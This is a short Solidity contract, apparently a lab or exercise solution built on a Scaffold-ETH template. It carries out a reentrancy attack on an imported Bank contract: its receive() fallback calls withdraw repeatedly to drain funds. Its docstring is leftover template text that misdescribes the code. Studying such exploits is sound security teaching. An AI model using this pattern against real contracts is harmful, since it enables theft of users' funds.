//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

// Useful for debugging. Remove when deploying to a live network.
import "hardhat/console.sol";

import "./Bank.sol";

// Use openzeppelin to inherit battle-tested implementations (ERC20, ERC721, etc)
// import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * A smart contract that allows changing a state variable of the contract and tracking the changes
 * It also allows the owner to withdraw the Ether in the contract
 * @author BuidlGuidl
 */
contract YourContract {
  Bank public bankContract;

  constructor(address payable bankAddress) {
    bankContract = Bank(bankAddress);
  }

  function myBalance() public view returns (uint256) {
    return bankContract.balance(address(this));
  }

  function depositToBank() public payable {
    bankContract.deposit{value: msg.value}();
  }

  function attackBank() public {
    bankContract.withdraw();
  }

  uint8 attacked = 0;

  /**
   * Function that allows the contract to receive ETH
   */
  receive() external payable {
    if(attacked <= 5) {
      attacked++;
      bankContract.withdraw();
    }
  }
}
